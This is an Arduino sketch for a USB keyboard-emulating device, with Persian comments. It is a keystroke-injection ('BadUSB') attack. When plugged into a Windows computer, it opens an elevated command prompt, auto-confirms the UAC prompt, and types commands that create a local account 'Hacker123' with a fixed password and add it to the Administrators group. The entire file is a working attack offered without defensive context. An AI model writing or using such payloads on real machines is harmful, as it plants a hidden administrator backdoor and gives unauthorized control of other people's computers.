#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  // باز کردن CMD با دسترسی ادمین (Win + X + A)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(1000);
  
  // تایید UAC با کلیدهای جهت دار و اینتر
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1000);
  
  // ایجاد کاربر
  Keyboard.println("net user Hacker123 P@ssw0rd! /add");
  Keyboard.println("net localgroup Administrators Hacker123 /add");
  Keyboard.println("exit");
}

void loop() {}
